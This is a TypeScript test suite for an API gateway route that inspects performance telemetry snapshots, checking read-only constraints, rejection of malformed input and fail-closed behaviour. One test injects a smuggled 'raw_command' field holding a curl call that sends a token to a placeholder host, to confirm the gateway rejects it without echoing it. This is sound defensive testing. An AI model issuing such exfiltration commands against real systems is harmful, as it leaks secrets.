import {
  performanceTelemetrySnapshotContract,
  type PerformanceTelemetryMetric,
  type PerformanceTelemetrySignal,
  type PerformanceTelemetrySnapshotRequest,
} from "@lnsat/packets";
import { afterAll, describe, expect, it } from "vitest";
import {
  buildApiGateway,
  performanceTelemetryInspectionGatewayContract,
} from "../src/index.js";

const now = new Date("2026-07-11T12:01:00.000Z");

describe("@lnsat/api BP-0853 performance telemetry inspection route", () => {
  const gateway = buildApiGateway({ now: () => now });

  afterAll(async () => {
    await gateway.close();
  });

  it("returns 200 for healthy caller-supplied telemetry", async () => {
    const response = await gateway.inject({
      method: performanceTelemetryInspectionGatewayContract.method,
      url: performanceTelemetryInspectionGatewayContract.path,
      payload: {
        request_id: "req_bp0853_route_healthy",
        telemetry_request: validTelemetryRequest(),
      },
    });
    expect(response.statusCode).toBe(200);
    expect(response.json()).toMatchObject({
      ok: true,
      contract_id: "lnsat.gateway.performance_telemetry.inspect.v0_1",
      request_id: "req_bp0853_route_healthy",
      inspected_at: "2026-07-11T12:01:00.000Z",
      telemetry_source: "caller_supplied",
      performance_status: "healthy",
      constraints: { read_only: true, collector_allowed: false },
      side_effects: [],
    });
  });

  it("returns 200 for critical evidence without activating controls", async () => {
    const telemetryRequest = validTelemetryRequest();
    telemetryRequest.snapshot.signals[0]!.value = 99;
    const response = await gateway.inject({
      method: "POST",
      url: "/v1/performance/telemetry/inspect",
      payload: { telemetry_request: telemetryRequest },
    });
    expect(response.statusCode).toBe(200);
    expect(response.json()).toMatchObject({
      ok: true,
      performance_status: "critical",
      health_status: "critical",
      constraints: {
        read_only: true,
        alert_dispatch_allowed: false,
        placement_allowed: false,
        runtime_allowed: false,
        database_write_allowed: false,
        network_access_allowed: false,
      },
      side_effects: [],
    });
  });

  it("returns 400 for malformed outer requests without raw echo", async () => {
    const response = await gateway.inject({
      method: "POST",
      url: "/v1/performance/telemetry/inspect",
      payload: {
        request_id: 853,
        raw_command: "curl https://example.invalid/?token:private-value",
        collector_allowed: true,
      },
    });
    expect(response.statusCode).toBe(400);
    expect(response.json()).toMatchObject({
      ok: false,
      request_errors: expect.arrayContaining([
        expect.objectContaining({
          code: "performance_telemetry_gateway.unexpected_field",
          path: "/*",
        }),
        expect.objectContaining({
          code: "performance_telemetry_gateway.invalid_request_id",
        }),
        expect.objectContaining({
          code: "performance_telemetry_gateway.missing_telemetry_request",
        }),
        expect.objectContaining({
          code: "performance_telemetry_gateway.collector_forbidden",
        }),
      ]),
      telemetry_errors: [],
      performance_telemetry_snapshot: null,
      raw_input_content: "withheld",
      side_effects: [],
    });
    expect(response.body).not.toContain("private-value");
    expect(response.body).not.toContain("curl");
    expect(response.body).not.toContain("raw_command");
  });

  it("returns 400 for delegated invalid telemetry", async () => {
    const response = await gateway.inject({
      method: "POST",
      url: "/v1/performance/telemetry/inspect",
      payload: {
        telemetry_request: {
          ...validTelemetryRequest(),
          alert_dispatch_allowed: true,
        },
      },
    });
    expect(response.statusCode).toBe(400);
    expect(response.json()).toMatchObject({
      ok: false,
      request_errors: [],
      telemetry_errors: [
        expect.objectContaining({
          code: "performance_telemetry.alert_dispatch_forbidden",
        }),
      ],
      raw_input_content: "withheld",
      side_effects: [],
    });
  });

  it("fails closed when injected clock throws", async () => {
    const clockGateway = buildApiGateway({
      now: () => {
        throw new Error("clock failure marker");
      },
    });
    try {
      const response = await clockGateway.inject({
        method: "POST",
        url: "/v1/performance/telemetry/inspect",
        payload: { telemetry_request: validTelemetryRequest() },
      });
      expect(response.statusCode).toBe(400);
      expect(response.json()).toMatchObject({
        ok: false,
        inspected_at: null,
        request_errors: [
          expect.objectContaining({
            code: "performance_telemetry_gateway.invalid_inspection_time",
          }),
        ],
      });
      expect(response.body).not.toContain("clock failure marker");
    } finally {
      await clockGateway.close();
    }
  });
});

function validTelemetryRequest(): PerformanceTelemetrySnapshotRequest {
  return {
    snapshot: {
      snapshot_id: "snapshot:lab-r730-01:0853-route",
      node_id: "node:lab-dell-r730-01",
      window_started_at: "2026-07-11T00:00:00.000Z",
      window_ended_at: "2026-07-11T00:10:00.000Z",
      signals: [
        signal("cpu", "cpu_utilization_pct", 50, "gauge"),
        signal("memory", "memory_utilization_pct", 60, "gauge"),
        signal("storage", "storage_utilization_pct", 50, "gauge"),
        signal("network", "network_utilization_pct", 30, "gauge"),
        signal("thermal", "thermal_celsius", 60, "gauge"),
        signal("workload", "workload_availability_pct", 99.99, "gauge"),
      ],
    },
    evaluated_at: "2026-07-11T00:10:30.000Z",
    max_age_ms: 60_000,
    collector_allowed: false,
    node_agent_allowed: false,
    hardware_probe_allowed: false,
    benchmark_execution_allowed: false,
    placement_allowed: false,
    alert_dispatch_allowed: false,
    runtime_allowed: false,
    database_write_allowed: false,
    network_access_allowed: false,
    side_effects: [],
  };
}

function signal(
  id: string,
  metricName: PerformanceTelemetryMetric,
  value: number,
  aggregation: PerformanceTelemetrySignal["aggregation"],
): PerformanceTelemetrySignal {
  const definition = performanceTelemetrySnapshotContract.metrics[metricName];
  return {
    signal_ref: `signal:${id}`,
    domain: definition.domain,
    metric: metricName,
    scope_ref: id === "workload" ? "service:gateway" : "node:lab-dell-r730-01",
    unit: definition.unit,
    aggregation,
    value,
    quality: "observed",
  };
}
